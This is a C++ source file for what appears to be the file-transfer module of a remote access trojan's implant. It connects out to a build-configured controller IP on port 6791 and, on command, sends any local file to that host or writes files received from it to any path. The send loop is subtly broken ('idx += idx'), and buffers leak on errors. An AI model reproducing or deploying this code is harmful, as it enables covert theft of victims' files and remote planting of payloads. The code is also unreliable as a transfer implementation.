#include "StdAfx.h"
#include "ServFileSock.h"


SOCKET fsock = NULL;

CServFileSock::CServFileSock(void)
{
}

CServFileSock::~CServFileSock(void)
{
}

void CServFileSock::FileSockStart(COMMEND cmd)
{
	if (fsock == NULL)
	{
		BUILD MyBuild = m_ServSock.MyGetBuildInfo();
		char aIP[40] = {0};
		WideCharToMultiByte(CP_ACP, 0, MyBuild.IP, 40, aIP, 40, NULL, NULL);
		//MessageBoxA(NULL, aIP, "1", NULL);
		fsock = m_ServSock.MyConnect(aIP, 6791);
	}
	if (cmd.fID == FILECANCEL)
	{
		if (fsock != NULL)
		{
			closesocket(fsock);
			fsock = NULL;
		}
	}
	wchar_t FilePath[MAX_PATH] = {0};
	memcpy(FilePath, cmd.teste, MAX_PATH);
	if (cmd.fID == FILEDOWN)
	{
		HANDLE hFile = CreateFile(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			return;
		}
		DWORD lpFileSize;
		lpFileSize = GetFileSize(hFile, &lpFileSize);
		MySendFile(fsock, FILECREATE, (char *)FilePath, MAX_PATH, lpFileSize);
		Sleep(100);
		//读取文件内容循环发送
		char *vBuf = new char[FILESIZE];
		while (1)
		{
			ZeroMemory(vBuf, FILESIZE);
			DWORD lpRead = 0;
			ReadFile(hFile, vBuf, FILESIZE, &lpRead, NULL);
			BOOL br = MySendFile(fsock, FILEDOWN, vBuf, lpRead, lpRead);
			if (lpRead < FILESIZE || !br)
			{
				CloseHandle(hFile);
				break;
			}
			Sleep(100);
		}
		delete[] vBuf;	
	}
	else if (cmd.fID == FILEUP)
	{
		FILESRCMD cmd;
		HANDLE hFile = CreateFile(FilePath,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
		if (hFile==INVALID_HANDLE_VALUE)
		{
			return;
		}
		while(1)
		{
			ZeroMemory(&cmd,FILESRSIZE);
			BOOL bRF = MyRecvFile(fsock,cmd);	
			if (bRF == FALSE)
			{
				CloseHandle(hFile);
				break;
			}
			DWORD rw=0;
			WriteFile(hFile,cmd.teste,cmd.fID,&rw,NULL);
			if (cmd.fID<FILESIZE)
			{
				CloseHandle(hFile);
				break;
			}
			Sleep(100);
		}

	}
}

BOOL CServFileSock::MyRecvFile(SOCKET sk,FILESRCMD &cmd)
{
	ZeroMemory(&cmd,FILESRSIZE);

	char *buf = new char[FILESRSIZE];
	ZeroMemory(buf,FILESRSIZE);
	int nLeft = FILESRSIZE;
	int idx = 0;
	while (nLeft>0)
	{
		int dx = recv(sk,&buf[idx],nLeft,0);
		if (SOCKET_ERROR == dx)
		{
			return FALSE;
		}
		nLeft -= dx;
		idx+=dx;
	}
	memcpy(&cmd,buf,FILESRSIZE);
	delete[]buf;
	return TRUE;
}

BOOL CServFileSock::MySendFile(SOCKET sk, int Id, char *text, int size, int fd)
{
	FILESRCMD cmd;
	ZeroMemory(&cmd, FILESRSIZE);
	cmd.ID = Id;
	if (text != NULL)
	{
		memcpy(cmd.teste, text, size);
	}
	cmd.fID = fd;

	char *buf = new char[FILESRSIZE];
	ZeroMemory(buf, FILESRSIZE);
	memcpy(buf, &cmd, FILESRSIZE);
	int nleft = FILESRSIZE;
	int idx = 0;
	while(nleft > 0)
	{
		int dx = send(sk, &buf[idx], FILESRSIZE, 0);
		if (dx == SOCKET_ERROR)
		{
			return FALSE;
		}
		nleft = nleft - dx;
		idx += idx;
	}
	delete []buf;

	return TRUE;
}